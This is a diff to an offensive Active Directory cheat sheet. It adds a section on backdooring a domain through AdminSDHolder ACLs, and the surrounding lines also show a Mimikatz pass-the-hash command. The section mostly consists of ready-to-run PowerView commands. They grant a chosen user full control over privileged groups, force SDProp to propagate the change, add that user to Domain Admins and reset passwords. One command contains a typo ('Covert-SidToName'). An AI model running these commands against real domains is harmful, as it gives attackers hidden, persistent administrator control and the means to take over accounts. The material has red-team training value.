@@ -15,7 +15,8 @@
   * [Diamond Ticket](#persistence-using-diamond-tickets)
   * [Skeleton Key](#persistence-using-skeleton-key)
   * [DSRM](#persistence-using-dsrm)
-  * [Custom SSP](#persistence-using-custom-ssp)
+  * [ACLs AdminSDHolder](#persistence-using-acls-adminsdholder)
+  * 
 
 ## General
 Connect to a machine with Administrator privileges
@@ -853,7 +854,67 @@ Then use the below command to pass the hash
 ```
 Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain_controller_name> /user:Administrator /ntlm:<Admin_hash> /run:powershell.exe"'
 ```
-## Persistence using Custom SSP
+## Persistence using ACLs AdminSDHolder
+AdminSDHolder resides in the system container of a domain and used to control the permissions for certain built-in privileged groups. Security Descriptor Propagator (SDPROP) runs every hour and compares the ACLs of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.
+
+Protected Groups:
+- Account Operators
+- Backup Operators
+- Server Operators
+- Print Operators
+- Domain Admins
+- Replicator
+- Enterprise Admins
+- Domain Controllers
+- Read-Only Domain Controllers
+- Schema Admins
+- Administrators
+
+Well known abuse of some of the Protected Groups - All the groups below can log on locally to DC
+| Group | Abuse |
+|-------|-------|
+| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within these groups |
+| Backup Operators | Backup GPO, edit to add SID of controlled account to privileged group and restore | 
+| Server Operators | Run a command as system |
+| Print Operators | Copy ntds.dit backup, load device drivers |
+
+With DA privileges we have full control on AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with full permission to the AdminSDHolder object. In 60 minutes the user will be added with full control to the AC of groups like Domain Admins without actually being member of it.
+
+With the following command we can add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
+```
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<domain>,dc=<domain>,dc=<domain>' -PrincipalIdentity <username> -Rights All -PrincipalDomain <domain> -TargetDomain <domain> -Verbose
+```
+
+Add the permission to ResetPassword
+```
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<domain>,dc=<domain>,dc=<domain>' -PrincipalIdentity <username> -Rights ResetPassword -PrincipalDomain <domain> -TargetDomain <domain> -Verbose
+```
+
+Add the permission to WriteMembers
+```
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<domain>,dc=<domain>,dc=<domain>' -PrincipalIdentity <username> -Rights WriteMember -PrincipalDomain <domain> -TargetDomain <domain> -Verbose
+```
+
+We can also run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory:
+```
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+```
+
+We can also check the Domain Admins permissions:
+```
+Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Covert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match <username>}
+```
+
+Abusing FullControl using PowerView
+```
+Add-DomainGroupMember -Identity 'Domain Admins' -Members <username> -Verbose
+```
+
+Abusing ResetPassword using PowerView
+```
+Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "Password123@" -AsPlainText -Force) -Verbose
+```
+
 
 
 
